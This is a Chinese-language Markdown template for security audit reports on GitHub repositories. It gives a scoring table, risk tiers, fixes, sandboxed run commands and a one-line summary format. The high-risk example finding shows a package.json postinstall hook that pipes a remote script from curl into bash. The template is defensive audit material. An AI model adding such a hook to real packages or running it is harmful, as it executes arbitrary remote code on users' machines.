# Report Template — 標準輸出格式

## 完整報告結構

```
## 安全審查報告 — {owner}/{repo}
**審查日期**：{date}
**語言/框架**：{lang}
**授權**：{license}（{license_status}）
**Stars**：{stars}

---

### 📊 總覽

| 項目 | 結果 |
|---|---|
| **總體安全分數** | **XX / 100** |
| 是否建議在本機執行 | ✅ 可執行 / ⚠️ 需沙盒 / ❌ 不建議 |
| 是否建議正式環境使用 | ✅ 可用 / ⚠️ 有條件 / ❌ 不建議 |
| 是否建議收入借用庫 | ✅ 可收 / ⚠️ 有條件 / ❌ 不收 |

---

### 🔴 高風險問題（N 項）

> *無高風險問題 / 以下為發現：*

**[H1] 問題簡述**
- **類別**：S1 供應鏈攻擊
- **位置**：`package.json:12`
- **證據**：
  ```json
  "postinstall": "curl https://example.com/install.sh | bash"
  ```
- **說明**：postinstall script 下載並執行遠端 shell script，可能在 npm install 時執行任意程式碼。

---

### 🟠 中風險問題（N 項）

**[M1] 問題簡述**
- **類別**：S6 CI 配置
- **位置**：`.github/workflows/ci.yml:34`
- **證據**：`uses: some-user/some-action@main`
- **說明**：外部 GitHub Action 使用 @main 分支，無版本鎖定，third-party 可隨時推送惡意程式碼。

---

### 🟡 低風險問題（N 項）

**[L1] 問題簡述**
- **類別**：S5 外部通訊
- **位置**：`src/telemetry.js:89`
- **證據**：`analytics.capture('event', data)`
- **說明**：使用 Segment analytics，預設啟用遙測，但有 opt-out 機制。

---

### ❓ 可疑但未確認（N 項）

**[U1] 問題簡述**
- **位置**：`lib/utils.js:203`
- **證據**：`const exec = require('child_process').exec`
- **說明**：引入 exec 但未在靜態分析中找到危險使用，需進一步追蹤動態呼叫路徑。

---

### 🔧 建議修補方式

1. **[H1] postinstall script**：移除或改為純本機指令，不從遠端下載執行。
2. **[M1] Action 版本鎖定**：改為 `uses: some-user/some-action@v1.2.3` 或 commit SHA。
3. **[L1] 關閉遙測**：在 config 加 `telemetry: false` 或 `DISABLE_TELEMETRY=1`。

---

### 🐳 安全執行方式（如仍需使用）

```bash
# Docker 沙盒，無網路
docker run --rm --network=none \
  -v $(pwd):/workspace:ro \
  -u nobody \
  node:20-alpine sh -c "cd /workspace && node index.js"

# 低權限執行（Linux）
sudo -u nobody /path/to/run.sh

# WSL 隔離（Windows）
wsl -d Ubuntu -- bash -c "cd /sandbox && node index.js"
```

---

### ⚠️ 靜態分析覆蓋限制

本次審查為**純靜態分析**，以下風險無法靠靜態方式偵測：

- **動態載入模組**（`require(variable)`）
- **Release 產物 vs Source 不一致**（tarball 可能與 source 不同）
- **間接依賴（transitive deps）**的供應鏈攻擊
- **Runtime-only 行為**（僅在特定環境/flag 觸發）
- **Base64 混淆 payload**
- **CI artifact 中的 secret 洩漏**

如需更高保障，建議搭配：
- [ ] `npm audit`（install 後執行）
- [ ] `semgrep --config=auto`（如已安裝）
- [ ] Docker 網路隔離沙盒執行測試
```

---

## 快速摘要格式（1 行版）

適用於輸出到 借用紀錄.md 的安全欄位：

```
安全：XX/100 ✅可收 | [H0 M1 L2] | 靜態分析 2026-06-22
安全：XX/100 ⚠️有條件 | [H0 M3 L1] 需修補 action 版本 | 靜態分析 2026-06-22
安全：XX/100 ❌不收 | [H2 M1 L3] postinstall 惡意 | 靜態分析 2026-06-22
```
